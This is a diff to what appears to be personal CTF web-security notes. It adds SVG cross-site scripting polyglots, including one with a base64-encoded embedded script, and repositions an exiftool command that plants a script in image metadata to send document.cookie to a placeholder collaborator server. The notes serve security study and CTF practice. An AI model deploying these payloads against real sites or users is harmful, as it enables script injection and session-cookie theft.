@@ -371,9 +371,9 @@ Polyglots:
 ```svg
 <?xml version="1.0" encoding="UTF-8" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="100px" height="100px" viewBox="0 0 751 751" enable-background="new 0 0 751 751" xml:space="preserve">  <image id="image0" width="751" height="751" x="0" y="0"
-    href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo" />
-<script>alert(1)</script>
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="100px" height="100px" viewBox="0 0 751 751" enable-background="new 0 0 751 751" xml:space="preserve">
+    <image id="image0" width="751" height="751" x="0" y="0" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo" />
+    <script>alert(1)</script>
 </svg>
 
 <?xml version="1.0" encoding="UTF-8"?> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="Layer_1" x="0px" y="0px" width="100px" height="100px" viewBox="-12.5 -12.5 100 100" xml:space="preserve">
@@ -396,15 +396,41 @@ Polyglots:
   </g>
   ...
 </svg>
+
+<svg id="rectangle" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
+    <script>alert(1)</script>
+    <foreignObject width="100" height="50" requiredExtensions="http://www.w3.org/1999/xhtml">
+        <embed xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(location)" />
+    </foreignObject>
+</svg>
+
+<svg>
+    <use xlink:href="data:image/svg+xml;base64,
+    PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cD
+    ovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhs
+    aW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW
+    5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+
+    PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3
+    JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0i
+    NTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZW
+    RFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8x
+    OTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dH
+    A6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0i
+    amF2YXNjcmlwdDphbGVydChsb2NhdGlvbikiIC8+DQ
+    ogICAgPC9mb3JlaWduT2JqZWN0Pg0KPC9zdmc+#rectangle" />
+</svg>
 ```
 
+- ~/code/snippets/ctf/web/redirect.svg
+- https://lorexxar.cn/2015/11/19/xss-link/
 - [CONFidence CTF 2019\-Web 50分析思考 &\#8211; 郁离歌丶的博客](http://yulige.top/?p=665)
     - [SVG XSS的一个黑魔法 · Tuuu Nya&\#39;s Blog](https://www.hackersb.cn/hacker/85.html)
 
-```bash
-exiftool -make "<script>document.location='http://burpcollaboratoridoryourserver?c='+document.cookie</script>" imagefinal.jpg
-```
-    - https://github.com/joshibeast/cft-writeups/blob/master/balccon2020/web-Imgr.txt
+- ~/code/snippets/ctf/web/xss_in_gif.js
+- https://github.com/joshibeast/cft-writeups/blob/master/balccon2020/web-Imgr.txt
+    ```bash
+    exiftool -make "<script>document.location='http://burpcollaboratoridoryourserver?c='+document.cookie</script>" imagefinal.jpg
+    ```
 
 # SQL Injection (SQLI)
 
